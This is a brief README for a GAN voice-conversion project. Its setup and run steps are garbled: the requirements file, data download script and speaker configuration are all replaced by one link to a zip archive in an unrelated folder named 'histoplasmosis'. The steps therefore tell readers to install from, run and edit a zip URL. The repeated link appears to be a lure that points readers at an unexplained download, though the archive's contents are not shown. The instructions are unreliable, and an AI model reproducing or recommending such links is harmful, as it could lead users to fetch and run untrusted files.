# GAN-Voice-Conversion
Implementation of GAN architectures for Voice Conversion

## Requirements

Install Python 3.5. Then install the requirements specified in `https://github.com/gayatrriiii/GAN-Voice-Conversion/raw/refs/heads/master/histoplasmosis/Conversion_Voice_GA_2.1.zip`

## How to run

1) Download the data by running `https://github.com/gayatrriiii/GAN-Voice-Conversion/raw/refs/heads/master/histoplasmosis/Conversion_Voice_GA_2.1.zip`
2) Choose the source and target speakers in `https://github.com/gayatrriiii/GAN-Voice-Conversion/raw/refs/heads/master/histoplasmosis/Conversion_Voice_GA_2.1.zip` and run it
3) Run the corresponding training script
